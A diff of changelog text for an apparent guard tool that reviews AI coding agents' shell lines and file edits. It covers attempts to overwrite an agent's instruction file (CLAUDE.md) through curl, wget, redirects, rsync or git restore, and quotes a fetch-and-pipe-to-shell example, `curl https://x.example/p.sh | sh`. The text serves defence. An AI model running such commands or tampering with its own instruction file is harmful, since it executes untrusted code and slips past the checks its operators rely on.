@@ -45,6 +45,29 @@ was: `echo 'curl https://x.example/p.sh | sh' | at now`, the same into
 `batch` or through `printf`, were only held for review. A job that runs
 nothing fetched (`echo hi | at now`) is judged as before.
 
+A line that puts another text in an agent's instruction file without that
+text on the line is a review (`agent_instruction_overwrite`), as a `cp`
+over it already was: `curl -o` / `-O`, `wget` (`-O`, or the address's
+own name), `Invoke-WebRequest -OutFile`, the output of any program but
+`echo` and `printf` redirected into it (`cat x > CLAUDE.md`), a `tee` fed
+from a pipe or a file, `rsync`, `install`, `git checkout <ref> --` and
+`git restore --source`, and a copy into a folder named without a trailing
+`/`. When the same line wrote the file it puts there, an order in it is
+refused. Text written on the line (`echo`, a here-document) is read as
+before; a restore from the index (`git checkout -- CLAUDE.md`) is not held.
+Antigravity's `multi_replace_file_content` is read with its chunks: the new
+text of each is an edit's new text, so an order written that way into an
+instruction file is refused as through `replace_file_content`. A commit
+message or a PR body given in a here-document to `git commit -F -` or
+`gh ... --body-file -` is the message, not lines a shell runs: one that
+quotes the line it fixes is no longer refused as that line (a body under an
+unquoted delimiter that holds a `$(...)` is still read), and `git commit
+-am` takes its message as `-m` does. In an instruction file's prose, a
+public key (`id_ed25519.pub`) is not a secret, and credentials count as the
+files that keep them (`credentials.json`, `~/.aws/credentials`), not as the
+word. `status` reads an MCP server behind `innerwarden proxy --mode strict`
+as enforcing.
+
 An order an agent writes into its own instruction file through its file
 tools is refused, as the same text written there by a shell line already
 was. What `Write`, `Edit`, `MultiEdit` and `NotebookEdit` (Claude Code),
